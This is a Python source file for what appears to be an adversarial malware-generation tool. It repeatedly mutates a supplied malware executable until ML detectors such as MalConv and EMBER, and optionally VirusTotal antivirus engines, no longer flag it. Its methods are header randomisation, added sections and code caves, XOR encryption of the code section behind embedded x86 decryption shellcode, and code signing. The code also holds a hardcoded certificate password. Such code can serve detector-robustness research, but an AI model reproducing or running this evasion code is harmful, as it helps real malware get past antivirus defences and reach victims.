import os
import glob
import shlex
import time
import copy
import struct
import pefile
import random
import string
import shutil
import warnings
import subprocess
import collections
import requests

from enum import IntEnum
from functools import reduce
from .constants import SECTION_LIST
from .models import (
    MalConvModel,
    EmberModel,
    MALCONV_MODEL_PATH,
    NONNEG_MODEL_PATH,
    EMBER_MODEL_PATH,
)

random.seed(time.time())

warnings.filterwarnings("ignore")


class ActionSet(IntEnum):
    RANDOMIZE_HEADERS = 0
    ADD_SECTION = 1
    ADD_CODE_CAVE = 2
    ADD_STUB_AND_ENCRYPT_CODE = 3
    RENAME_EXISTING_SECTION = 4
    SIGN_PE = 5


class State:
    def __init__(
        self,
        action_set=[
            ActionSet.RANDOMIZE_HEADERS,
            ActionSet.ADD_SECTION,
            ActionSet.ADD_CODE_CAVE,
            ActionSet.ADD_STUB_AND_ENCRYPT_CODE,
            ActionSet.RENAME_EXISTING_SECTION,
            ActionSet.SIGN_PE,
        ],
    ):
        self.epoch = 0
        self.action_list = []
        self.pe_past_state = None
        self.prediction_to_beat = 1
        self.pe_past_section_info_state = None
        self.action_set = action_set
        self.weights = {self.action_set[i]: 1 for i in range(len(self.action_set))}



class MalWorkz:
    def __init__(
        self,
        malware_path,
        new_pe_name,
        step=0.00001,
        threshold=0.5,
        max_pe_size_bytes=2000000,
        model="ember",
        max_epochs=100,
        avs=[],
        virustotal_api_key=None,
        use_virustotal=False,
        action_set=[
            ActionSet.RANDOMIZE_HEADERS,
            ActionSet.ADD_SECTION,
            ActionSet.ADD_CODE_CAVE,
            ActionSet.ADD_STUB_AND_ENCRYPT_CODE,
            ActionSet.RENAME_EXISTING_SECTION,
            ActionSet.SIGN_PE,
        ],
    ):
        self.pe = pefile.PE(malware_path)
        self.step = step
        self.model = model
        self.malware_path = malware_path
        self.state = State(action_set=action_set)
        self.new_pe_name = new_pe_name
        self.max_epochs = max_epochs
        self.code_cave_size = 512
        self.threshold = threshold
        self.section_data_choices = []
        self.max_pe_size_bytes = max_pe_size_bytes
        self.section_info = collections.OrderedDict()
        self.pe.__data__ = bytearray(self.pe.__data__)
        self.is_dll = self.pe.FILE_HEADER.IMAGE_FILE_DLL
        self.avs = avs
        self.virustotal_api_key = virustotal_api_key
        self.use_virustotal = use_virustotal

        self.setup()

    def setup(self):
        self.set_section_info()
        self.set_section_data_choices()
        self.check_entrypoint_collsion()
        self.remove_digital_signature()

    def set_section_info(self):
        for i in range(len(self.pe.sections)):
            section_name = self.pe.sections[i].Name.decode("utf-8")
            self.section_info[section_name] = {
                "SizeOfRawData": copy.deepcopy(self.pe.sections[i].SizeOfRawData),
                "PointerToRawData": copy.deepcopy(self.pe.sections[i].PointerToRawData),
                "section_index": i,
            }
            if section_name in SECTION_LIST:
                SECTION_LIST.remove(section_name)

    def set_section_data_choices(self):
        
        section_choices = glob.glob("data_sections/*")
        for i in range(len(section_choices)):
            file_size = os.path.getsize(section_choices[i])
            if file_size > self.pe.OPTIONAL_HEADER.SectionAlignment:
                self.section_data_choices.append(section_choices[i])

    def check_entrypoint_collsion(self):

        # Check if .NET
        if (
            len(self.pe.OPTIONAL_HEADER.DATA_DIRECTORY)
            >= pefile.DIRECTORY_ENTRY["IMAGE_DIRECTORY_ENTRY_COM_DESCRIPTOR"]
            and self.pe.OPTIONAL_HEADER.DATA_DIRECTORY[
                pefile.DIRECTORY_ENTRY["IMAGE_DIRECTORY_ENTRY_COM_DESCRIPTOR"]
            ].VirtualAddress
            != 0
        ):
            return

        _, entrypoint_virt_size, entrpoint_virt_addr, _, _ = self.get_entry_section()

        for dd in self.pe.OPTIONAL_HEADER.DATA_DIRECTORY:
            if dd.VirtualAddress >= entrpoint_virt_addr and dd.VirtualAddress < (
                entrpoint_virt_addr + entrypoint_virt_size
            ):
                self.state.action_set.remove(ActionSet.ADD_STUB_AND_ENCRYPT_CODE)
                del self.state.weights[ActionSet.ADD_STUB_AND_ENCRYPT_CODE]
                print(
                    "Entrypoint collision - Data Directory maps to entrypoint removing ActionSet.ADD_STUB_AND_ENCRYPT_CODE\n"
                )
                break

    def get_shellcode(
        self, section_virtual_address, section_virtual_size, entrypoint_rva, image_base
    ):
        buf = bytearray()
        buf += b"\xE8\x1F\x00\x00\x00"  # call ChangeSectionProtections
        buf += b"\x64\xA1\x30\x00\x00\x00"  # mov eax, dword ptr fs:[00000030h] (Get offset to PEB)
        buf += b"\x8B\x40\x08"  # mov eax, [eax + 08h] (Get ImageBaseAddress from PEB)
        buf += b"\x05" + struct.pack(
            "<I", section_virtual_address
        )  # add eax, 01000h (Add the ImageBaseAddress with the section RVA)
        buf += b"\x50"  # push eax (Store the section virtual address on the stack)
        buf += b"\x68" + struct.pack(
            "<I", section_virtual_size
        )  # push 02eh (Store the section virtual size on the stack)
        buf += b"\xE8\x9c\x00\x00\x00"  # call DecryptSection
        buf += b"\x68" + struct.pack("<I", entrypoint_rva)  # push entrypoint address
        buf += b"\xC3"  # ret

        # ChangeSectionProtections:
        buf += b"\x55"  # push ebp
        buf += b"\x8B\xEC"  # mov ebp, esp
        buf += b"\x83\xEC\x14"  # sub esp, 14h (Set up stack space for local variables)
        buf += b"\x68\x72\x6F\x74\x00"  # push 00746f72h ; Null, t, o ,r
        buf += b"\x68\x75\x61\x6C\x50"  # push 506c6175h ; P, l, a, u
        buf += b"\x68\x56\x69\x72\x74"  # push 74726956h ; t, r, i, V
        buf += b"\x89\x65\xEC"  # mov [ebp - 14h], esp (Store address to VirtualProt string)
        buf += b"\x64\xA1\x30\x00\x00\x00"  # mov eax, [fs:30h]  (Get offset to PEB)
        buf += b"\x8B\x40\x0C"  # mov eax, [eax + 0ch] (Get offset to LDR)
        buf += (
            b"\x8B\x40\x14"  # mov eax, [eax + 14h] (Pointer to InMemoryOrderModuleList)
        )
        buf += b"\x8B\x00"  # mov eax, [eax] (this program's module)
        buf += b"\x8B\x00"  # mov eax, [eax] (ntdll module)
        buf += b"\x8B\x40\x10"  # mov eax, [eax + 10h] (kernel32.DllBase)

        # Find VirtualProtect
        buf += (
            b"\x8B\x98\x70\x01\x00\x00"  # mov ebx, [eax + 170h]  (RVA of Export table)
        )
        buf += b"\x03\xD8"  # add ebx, eax (Address of Export Table)

        # Get NumberOfFunctions
        buf += b"\x8B\x4B\x14"  # mov ecx, [ebx + 14h] (store the number of exported functions in ebx)
        buf += b"\x89\x4D\xFC"  # mov [ebp - 04h], ecx (store the number of exported functions)

        # Get AddressOfNames
        buf += b"\x8B\x4B\x20"  # mov ecx, [ebx + 20h]
        buf += b"\x03\xC8"  # add ecx, eax
        buf += b"\x89\x4D\xF8"  # mov [ebp - 08h], ecx (move address of names into stack offset)

        # Get AddressOfOrdinals
        buf += b"\x8B\x4B\x24"  # mov ecx, [ebx + 24h]
        buf += b"\x03\xC8"  # add ecx, eax
        buf += b"\x89\x4D\xF4"  # mov [ebp - 0ch], ecx (move address of ordinals into stack offset)
        buf += b"\x33\xDB"  # xor ebx, ebx
        buf += b"\x33\xC9"  # xor ecx, ecx

        # Loop through function names and locate VirtualProtect
        # LoopDLLFunctions:
        buf += b"\x8B\x75\xEC"      # mov esi, [ebp - 14h]
        buf += b"\x8B\x7D\xF8"      # mov edi, [ebp - 08h]
        buf += b"\x8B\x3C\x9F"      # mov edi, [edi + ebx * 4]
        buf += b"\x03\xF8"          # add edi, eax
        buf += b"\x66\xB9\x0B\x00"  # mov cx, 11 (Compare first 11 bytes)
        buf += b"\xF3\xA6"          # repe cmpsb
        buf += b"\x74\x06"          # jz SetUpVirtualProtectCall
        buf += b"\x43"              # inc ebx
        buf += b"\x3B\x5D\xFC"      # cmp ebx, [ebp - 4h]
        buf += b"\x75\xE7"          # jne LoopDLLFunctions

        # SetUpVirtualProtectCall:
        buf += b"\x8B\x4D\xF4"  # mov ecx, [ebp - 0ch]   (Ordinal table)
        buf += (
            b"\x8B\x90\x70\x01\x00\x00"  # mov edx, [eax + 170h]	 (RVA export address)
        )
        buf += b"\x03\xD0"  # add edx, eax  (export address table)
        buf += b"\x8B\x52\x1C"  # mov edx, [edx + 1ch]  (RVA AddressOfFunctions)
        buf += b"\x03\xD0"  # add edx, eax (Virtual address of functions)

        # Get address of VirtualProtect function
        buf += b"\x66\x8B\x1C\x59"  # mov bx, [ecx + ebx*2]	(get VirtualProtect ordinal)
        buf += b"\x8B\x1C\x9A"  # mov ebx, [edx + ebx*4]  (get RVA of VirtualProtect function)
        buf += b"\x03\xD8"  # add ebx, eax (get VA of VirtualProtect)

        # CallVirtualProtect:
        buf += b"\x6A\x20"  # push 20h (PAGE_EXECUTE_READ)
        buf += b"\x8B\xCC"  # mov ecx, esp
        buf += b"\x51"  # push ecx
        buf += b"\x6A\x40"  # push 40h  (PAGE_EXECUTE_READWRITE)
        buf += b"\x68" + struct.pack(
            "<I", section_virtual_size
        )  # push 0d3h   (SIZE_T dwSize)
        buf += b"\x68" + struct.pack(
            "<I", image_base + section_virtual_address
        )  # push 00401000h ; LPVOID lpAddress
        buf += b"\xFF\xD3"  # call ebx
        buf += b"\x8B\xE5"  # mov esp, ebp
        buf += b"\x5D"  # pop ebp
        buf += b"\xC3"  # ret

        # DecryptSection:
        buf += b"\x55"  # push ebp
        buf += b"\x8B\xEC"  # mov ebp, esp
        buf += b"\x8B\x45\x0C"  # mov eax, [ebp + 12]  (move virtual address into eax register)
        buf += b"\x33\xDB"  # xor ebx, ebx (set up loop counter)

        # LoopXor:
        buf += b"\x80\x30\xAA"  # xor byte ptr [eax], 0AAh
        buf += b"\x83\xC0\x01"  # add eax, 1  (move the byte at the section offset into register dl)
        buf += b"\x43"  # inc ebx  (imncrement loop counter)
        buf += b"\x81\xFB" + struct.pack(
            "<I", section_virtual_size
        )  # cmp ebx, 0d3h  (compare loop counter with section virtual size)
        buf += b"\x75\xF1"  # jne LoopXor (continue loop if loop counter not equal to section virtual size)
        buf += b"\x8B\xE5"  # mov esp, ebp
        buf += b"\x5D"  # pop ebp
        buf += b"\xC3"  # ret

        return buf

    def get_entry_section(self):

        section_offset = 0
        for section in self.pe.sections:
            if (
                self.pe.OPTIONAL_HEADER.AddressOfEntryPoint >= section.VirtualAddress
                and self.pe.OPTIONAL_HEADER.AddressOfEntryPoint
                < section.VirtualAddress + section.Misc_VirtualSize
            ):
                entrypoint_rva = (
                    self.pe.OPTIONAL_HEADER.ImageBase
                    + self.pe.OPTIONAL_HEADER.AddressOfEntryPoint
                )
                return (
                    section.Name.decode("utf-8"),
                    section.Misc_VirtualSize,
                    section.VirtualAddress,
                    entrypoint_rva,
                    section_offset,
                )
            section_offset += 1

        return None

    def align_new_section_size(self, current_section_size, section_alignment):
        return (
            ((current_section_size + section_alignment) // section_alignment)
            * section_alignment
            if current_section_size % section_alignment
            else current_section_size
        )

    def remove_digital_signature(self):
        virtual_address = self.pe.OPTIONAL_HEADER.DATA_DIRECTORY[
            pefile.DIRECTORY_ENTRY["IMAGE_DIRECTORY_ENTRY_SECURITY"]
        ].VirtualAddress
        self.pe.OPTIONAL_HEADER.DATA_DIRECTORY[
            pefile.DIRECTORY_ENTRY["IMAGE_DIRECTORY_ENTRY_SECURITY"]
        ].VirtualAddress = 0
        self.pe.OPTIONAL_HEADER.DATA_DIRECTORY[
            pefile.DIRECTORY_ENTRY["IMAGE_DIRECTORY_ENTRY_SECURITY"]
        ].Size = 0

        return (
            pefile.PE(data=self.pe.write()[0:virtual_address])
            if virtual_address
            else pefile.PE(data=self.pe.write())
        )

    def encrypt_sections(self, entrypoint_section_name):
        entrypoint_section_name = entrypoint_section_name.replace("\x00", "")

        for section in self.pe.sections:
            section_name = section.Name.decode("utf-8").replace("\x00", "")
            if section_name == entrypoint_section_name:
                section_data = section.get_data()
                encrypted_content = [
                    section_data[i] ^ 0xAA for i in range(len(section_data))
                ]
                self.pe.set_bytes_at_offset(
                    section.PointerToRawData, bytes(encrypted_content)
                )

    def rename_section(self):
        self.pe.sections[
            random.randrange(0, len(self.pe.sections))
        ].Name = SECTION_LIST[random.randrange(0, len(SECTION_LIST))]

    def add_section(self):
        section_data_choices = glob.glob("data_sections/*")

        data_file = section_data_choices[random.randrange(len(section_data_choices))]

        try:
            with open(data_file, "rb") as f:
                data = f.read()
        except IOError:
            print("Error: cannot open the file - {}".format(data_file))

        last_section = self.pe.sections[-1]
        new_section = pefile.SectionStructure(self.pe.__IMAGE_SECTION_HEADER_format__)

        new_section.__unpack__(bytearray(new_section.sizeof()))

        new_section.set_file_offset(
            last_section.get_file_offset() + last_section.sizeof()
        )

        new_section.Name = self.get_random_section_name()

        new_section_size = len(data)

        new_section.SizeOfRawData = self.align_new_section_size(
            new_section_size, self.pe.OPTIONAL_HEADER.FileAlignment
        )
        new_section.PointerToRawData = len(self.pe.__data__)

        new_section.Misc = (
            new_section.Misc_PhysicalAddress
        ) = new_section.Misc_VirtualSize = new_section_size
        new_section.VirtualAddress = (
            last_section.VirtualAddress
            + self.align_new_section_size(
                last_section.Misc_VirtualSize, self.pe.OPTIONAL_HEADER.SectionAlignment
            )
        )

        new_section.Characteristics = (
            0x40000000 | 0x20000000 | 0x20
        )  # read | execute | code

        new_section_data = data + bytearray(
            b"\x00" * (new_section.SizeOfRawData - len(data))
        )

        # increase size of image
        self.pe.OPTIONAL_HEADER.SizeOfImage += self.align_new_section_size(
            new_section_size, self.pe.OPTIONAL_HEADER.SectionAlignment
        )

        # increase number of sections
        self.pe.FILE_HEADER.NumberOfSections += 1

        # append new section to structures
        self.pe.sections.append(new_section)

        self.pe.__structures__.append(new_section)

        # add new section data to file
        self.pe.__data__ = self.pe.__data__ + new_section_data

        self.section_info[new_section.Name] = {
            "SizeOfRawData": copy.deepcopy(new_section.SizeOfRawData),
            "PointerToRawData": copy.deepcopy(new_section.PointerToRawData),
            "section_index": self.pe.FILE_HEADER.NumberOfSections - 1,
        }

    def get_random_section_name(self):
        if len(SECTION_LIST) == 0:
            return str.encode(
                "." + "".join(random.choices(string.ascii_lowercase, k=6))
            )

        idx = random.randrange(len(SECTION_LIST))
        section_name = SECTION_LIST[idx]
        SECTION_LIST.pop(idx)

        return section_name

    def add_stub_and_encrypt_code_section(self):
        last_section = self.pe.sections[-1]

        # IMAGE_FILE_RELOCS_STRIPPED | IMAGE_FILE_EXECUTABLE_IMAGE | IMAGE_FILE_32BIT_MACHINE | IMAGE_FILE_DLL
        self.pe.FILE_HEADER.Characteristics = (
            0x00000001 | 0x00000002 | 0x00000100 | 0x00002000
            if self.is_dll
            else 0x00000001 | 0x00000002 | 0x00000100
        )

        (
            entrypoint_section_name,
            section_virtualsize,
            section_virtualaddress,
            entrypoint_rva,
            section_offset,
        ) = self.get_entry_section()
        shellcode = self.get_shellcode(
            section_virtualaddress,
            section_virtualsize,
            entrypoint_rva,
            self.pe.OPTIONAL_HEADER.ImageBase,
        )
        self.encrypt_sections(entrypoint_section_name)

        # search for a code cave within enough spare bytes within the entrypoint section for the shellcode
        # If none exists create a new section with and place the shellcode within it
        for section in self.pe.sections:
            if section.Name.decode("utf-8") == entrypoint_section_name:
                if section.SizeOfRawData - section.Misc_VirtualSize > len(shellcode):
                    self.pe.set_bytes_at_offset(
                        section.PointerToRawData + section.Misc_VirtualSize + 1,
                        bytes(shellcode),
                    )
                    self.pe.OPTIONAL_HEADER.AddressOfEntryPoint = (
                        section.VirtualAddress + section.Misc_VirtualSize + 1
                    )
                    section.Misc_VirtualSize += len(shellcode)
                    return

        new_section = pefile.SectionStructure(self.pe.__IMAGE_SECTION_HEADER_format__)

        new_section.__unpack__(bytearray(new_section.sizeof()))

        new_section.set_file_offset(
            last_section.get_file_offset() + last_section.sizeof()
        )

        new_section.Name = self.get_random_section_name()

        new_section_size = 4096

        new_section.SizeOfRawData = self.align_new_section_size(
            new_section_size, self.pe.OPTIONAL_HEADER.FileAlignment
        )
        new_section.PointerToRawData = len(self.pe.__data__)

        new_section.Misc = (
            new_section.Misc_PhysicalAddress
        ) = new_section.Misc_VirtualSize = new_section_size
        new_section.VirtualAddress = (
            last_section.VirtualAddress
            + self.align_new_section_size(
                last_section.Misc_VirtualSize, self.pe.OPTIONAL_HEADER.SectionAlignment
            )
        )

        new_section.Characteristics = (
            0x40000000 | 0x20000000 | 0x20
        )  # read | execute | code

        new_section_data = bytearray(b"\x00" * new_section_size)

        for i in range(len(shellcode)):
            new_section_data[i] = shellcode[i]

        # self.pe.sections[section_offset].Name = b".code"
        self.pe.sections[section_offset].Characteristics = 0x40000000 | 0x00000040

        # change address of entry point to beginning of new section
        self.pe.OPTIONAL_HEADER.AddressOfEntryPoint = new_section.VirtualAddress

        # increase size of image
        self.pe.OPTIONAL_HEADER.SizeOfImage += self.align_new_section_size(
            new_section_size, self.pe.OPTIONAL_HEADER.SectionAlignment
        )

        # increase number of sections
        self.pe.FILE_HEADER.NumberOfSections += 1

        # set the image base address to the new section's virtual address
        self.pe.OPTIONAL_HEADER.BaseOfCode = new_section.VirtualAddress

        # append new section to structures
        self.pe.sections.append(new_section)
        self.pe.__structures__.append(new_section)

        # add new section data to file
        self.pe.__data__ = self.pe.__data__ + new_section_data

    def sign_exe(self):
        try:
            command = "signtool sign /f MalWorkz/malworkzcert.pfx /p qwerty123 /fd SHA256 {}".format(
                self.new_pe_name
            )
            subprocess.check_call(
                shlex.split(command),
                stdin=subprocess.DEVNULL,
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL,
            )
        except Exception as e:
            print("Error signing exe: {}".format(e))

    def randomize_headers(self):
        dll_characteristics = [
            0x0020,   # IMAGE_DLLCHARACTERISTICS_HIGH_ENTROPY_VA
            0x0040,   # IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE
            # 0x0080, # IMAGE_DLLCHARACTERISTICS_FORCE_INTEGRITY
            0x0100,   # IMAGE_DLLCHARACTERISTICS_NX_COMPAT
            0x0200,   # IMAGE_DLLCHARACTERISTICS_NO_ISOLATION
            0x0400,   # IMAGE_DLLCHARACTERISTICS_NO_SEH
            0x0800,   # IMAGE_DLLCHARACTERISTICS_NO_BIND
            # 0x1000, # IMAGE_DLLCHARACTERISTICS_APPCONTAINER
            0x2000,   # IMAGE_DLLCHARACTERISTICS_WDM_DRIVER
            # 0x4000, # IMAGE_DLLCHARACTERISTICS_GUARD_CF
            0x8000,   # IMAGE_DLLCHARACTERISTICS_TERMINAL_SERVER_AWARE
        ]

        file_header_characteristics = [
            # 0x0001, # IMAGE_FILE_RELOCS_STRIPPED
            # 0x0002, # IMAGE_FILE_EXECUTABLE_IMAGE
            0x0004,   # IMAGE_FILE_LINE_NUMS_STRIPPED
            0x0008,   # IMAGE_FILE_LOCAL_SYMS_STRIPPED
            0x0010,   # IMAGE_FILE_AGGRESIVE_WS_TRIM
            0x0020,   # IMAGE_FILE_LARGE_ADDRESS_AWARE
            # 0x0080, # IMAGE_FILE_BYTES_REVERSED_LO
            0x0100,   # IMAGE_FILE_32BIT_MACHINE
            0x0200,   # IMAGE_FILE_DEBUG_STRIPPED
            0x0400,   # IMAGE_FILE_REMOVABLE_RUN_FROM_SWAP
            0x0800,   # IMAGE_FILE_NET_RUN_FROM_SWAP
            0x1000,   # IMAGE_FILE_SYSTEM
            # 0x2000, # IMAGE_FILE_DLL
            0x4000,   # IMAGE_FILE_UP_SYSTEM_ONLY
            # 0x8000, # IMAGE_FILE_BYTES_REVERSED_HI
        ]

        self.pe.OPTIONAL_HEADER.DATA_DIRECTORY[
            pefile.DIRECTORY_ENTRY["IMAGE_DIRECTORY_ENTRY_DEBUG"]
        ].VirtualAddress = 0
        self.pe.OPTIONAL_HEADER.DATA_DIRECTORY[
            pefile.DIRECTORY_ENTRY["IMAGE_DIRECTORY_ENTRY_DEBUG"]
        ].Size = 0

        self.pe.OPTIONAL_HEADER.MajorImageVersion = random.randrange(10)
        self.pe.OPTIONAL_HEADER.MinorImageVersion = random.randrange(10)

        self.pe.OPTIONAL_HEADER.MajorOperatingSystemVersion = random.randrange(10)
        self.pe.OPTIONAL_HEADER.MinorOperatingSystemVersion = random.randrange(10)

        self.pe.OPTIONAL_HEADER.SizeOfStackReserve = random.randrange(
            0x00010000, 0x000F0000
        )
        self.pe.OPTIONAL_HEADER.SizeOfStackCommit = random.randrange(
            0x00001000, 0x000F000
        )

        self.pe.OPTIONAL_HEADER.MajorLinkerVersion = random.randrange(0x0F)
        self.pe.OPTIONAL_HEADER.MinorLinkerVersion = random.randrange(0x1F)

        self.pe.FILE_HEADER.TimeDateStamp = random.randrange(0x00000000, 0xFFFFFFFF)

        total_dll_characteristics = random.randrange(1, len(dll_characteristics))
        chosen_dll_characteristics = []
        for _ in range(total_dll_characteristics):
            idx = random.randrange(len(dll_characteristics))
            random_characteristic = dll_characteristics[idx]
            dll_characteristics.pop(idx)
            chosen_dll_characteristics.append(random_characteristic)

        self.pe.OPTIONAL_HEADER.DllCharacteristics = reduce(
            lambda a, b: a | b, chosen_dll_characteristics
        )

        total_file_header_characteristics = random.randrange(
            0, len(file_header_characteristics)
        )
        chosen_file_header_characteristics = []
        for _ in range(total_file_header_characteristics):
            idx = random.randrange(len(file_header_characteristics))
            total_file_header_characteristics = file_header_characteristics[idx]
            file_header_characteristics.pop(idx)
            chosen_file_header_characteristics.append(total_file_header_characteristics)

        chosen_file_header_characteristics.append(0x0001)
        chosen_file_header_characteristics.append(0x0002)

        if self.is_dll:
            chosen_file_header_characteristics.append(0x2000)

        self.pe.FILE_HEADER.Characteristics = reduce(
            lambda a, b: a | b, chosen_file_header_characteristics
        )

    def append_overlay(self):
        self.pe.__data__ += struct.pack("B", random.randint(0, 255))

    def get_data(self, raw_data_size_delta):
        data_file = self.section_data_choices[
            random.randrange(len(self.section_data_choices))
        ]

        try:
            with open(data_file, "rb") as f:
                data = f.read()
        except IOError:
            print("Error: cannot open the file - {}".format(data_file))

        # choose a random offset for the data sample
        offset = random.randrange(0, len(data) - raw_data_size_delta)

        return bytearray(data[offset : offset + raw_data_size_delta])

    def add_code_cave(self):
        last_section_end_offset = 0
        offsets = {}

        for section_name, section_info in self.section_info.items():
            new_section_size = section_info["SizeOfRawData"] + self.code_cave_size
            new_size_of_raw_data = self.align_new_section_size(
                new_section_size, self.pe.OPTIONAL_HEADER.SectionAlignment
            )
            raw_data_size_delta = new_size_of_raw_data - section_info["SizeOfRawData"]
            new_code_data = self.get_data(raw_data_size_delta)

            if section_info["section_index"] == 0:
                offsets[
                    self.pe.sections[section_info["section_index"]].PointerToRawData
                    + section_info["SizeOfRawData"]
                ] = new_code_data
            else:
                offsets[
                    last_section_end_offset + section_info["SizeOfRawData"]
                ] = new_code_data
                self.pe.sections[
                    section_info["section_index"]
                ].PointerToRawData = last_section_end_offset

            last_section_end_offset = (
                self.pe.sections[section_info["section_index"]].PointerToRawData
                + new_size_of_raw_data
            )
            self.section_info[section_name]["SizeOfRawData"] = new_size_of_raw_data

        if not os.path.exists("temp/"):
            os.mkdir("temp/")

        # Extrememly janky method for creating code caves in a PE
        # Should be done all in memory, but the underlying mmap structure
        # which the pefile library utilizes is corrupted
        # if a pure memory modification of the pe data is attempted.
        # The only reliable method I found is to
        #       1. write the pefile to disk
        #       2. Load the pe file into a bytearray
        #       3. Make the code cave modifications
        #       4. Write the bytearray to disk
        #       5. Reload the modified pe file back into the pefile structure and continue
        random_file_name = str(time.time())
        self.pe.write("temp/{}".format(random_file_name))
        self.pe.close()
        
        with open("temp/{}".format(random_file_name), "rb+") as f:
            ba = bytearray(f.read())
            f.close()

        for k, v in offsets.items():
            ba[k:k] = v

        with open("temp/{}".format(random_file_name), "wb+") as f:
            f.write(ba)
            f.close()
        
        self.pe = pefile.PE("temp/{}".format(random_file_name))

    def write(self):
        try:
            self.pe.OPTIONAL_HEADER.CheckSum = self.pe.generate_checksum()
            self.pe.write(self.new_pe_name)
            self.pe.close()
        except Exception as e:
            print("Error: unable to compute checksum - {}".format(e))

        if os.path.exists("temp/"):
            shutil.rmtree("temp/")

    def update_action_weights(self):
        self.state.weights[self.state.action_list[-1]] += 1

    def select_random_action(self):
        return random.choices(
            self.state.action_set,
            weights=tuple([v for k, v in self.state.weights.items()]),
            k=1,
        )[0]

    def execute_action(self, action):
        if action == ActionSet.RANDOMIZE_HEADERS:
            self.randomize_headers()
        elif action == ActionSet.ADD_SECTION:
            self.add_section()
        elif action == ActionSet.ADD_CODE_CAVE:
            self.add_code_cave()
        elif action == ActionSet.ADD_STUB_AND_ENCRYPT_CODE:
            self.add_stub_and_encrypt_code_section()

    def evaluate(self):
        file_data = open(self.new_pe_name, "rb").read()

        models = {
            "malconv":        MalConvModel(MALCONV_MODEL_PATH, thresh=0.5),
            "nonneg_malconv": MalConvModel(NONNEG_MODEL_PATH, thresh=0.35, name="nonneg_malconv"),
            "ember":          EmberModel(EMBER_MODEL_PATH, thresh=0.8336),
        }

        if self.use_virustotal:
            results = self.file_submit(file_data)
            
            if 'malicious' in results:
                return models[self.model].predict(file_data)
            else:
                return 0
        else:
            return models[self.model].predict(file_data)


    def generate_adversarial_pe(self):
        self.state.pe_past_state = copy.deepcopy(self.pe)
        self.state.pe_past_section_info_state = copy.deepcopy(self.section_info)

        for _ in range(self.max_epochs):
            self.state.epoch += 1
            self.state.action_list.append(self.select_random_action())
            self.execute_action(self.state.action_list[-1])
            self.write()

            if ActionSet.SIGN_PE in self.state.action_list:
                self.sign_exe()

            prediction_score = self.evaluate()
            file_size = os.path.getsize(self.new_pe_name)

            if (
                prediction_score <= self.threshold
                and file_size < self.max_pe_size_bytes
            ):
                print("Success! Generated Adversarial PE")
                print("Prediction Score: {}".format(prediction_score))
                print("Epochs: {}".format(self.state.epoch))
                print("Action List: {}".format(self.state.action_list))
                return

            if (
                prediction_score < (self.state.prediction_to_beat - self.step)
                and file_size < self.max_pe_size_bytes
            ):
                self.state.pe_past_state = copy.deepcopy(self.pe)
                self.state.pe_past_section_info_state = copy.deepcopy(self.section_info)
                self.state.prediction_to_beat = prediction_score
                if (
                    self.state.action_list[-1] == ActionSet.ADD_STUB_AND_ENCRYPT_CODE
                    or self.state.action_list[-1] == ActionSet.SIGN_PE
                ):
                    self.state.action_set.remove(self.state.action_list[-1])
                    del self.state.weights[self.state.action_list[-1]]
                else:
                    self.update_action_weights()
            else:
                self.pe = copy.deepcopy(self.state.pe_past_state)
                self.section_info = copy.deepcopy(self.state.pe_past_section_info_state)
                self.state.action_list.pop()

            print("Epoch: {}".format(self.state.epoch))
            print("Prediction Score to Beat: {}".format(self.state.prediction_to_beat))
            print("Action List: {}\n".format(self.state.action_list))

    def file_get(self, link):
        results = []

        headers = {
            "accept": "application/json",
            "x-apikey": self.virustotal_api_key
        }

        r = requests.get(link, headers=headers)
        while r.json()['data']['attributes']['status'] == 'queued':
            print(f"Virustotal Status: {r.json()['data']['attributes']['status']}")
            r = requests.get(link, headers=headers)
            time.sleep(30)

        for av in self.avs:
            results.append(r.json()['data']['attributes']['results'][av]['category'])
            print(f"{r.json()['data']['attributes']['results'][av]['engine_name']} - {r.json()['data']['attributes']['results'][av]['category']}")

        return results

    def file_submit(self, pe_file):
        
        url = "https://www.virustotal.com/api/v3/files"

        files = {"file": ("010", pe_file, "application/x-msdownload")}
        headers = {
            "accept": "application/json",
            "x-apikey": self.virustotal_api_key
        }

        r = requests.post(url, files=files, headers=headers)
        
        results = self.file_get(r.json()['data']['links']['self'])

        return results
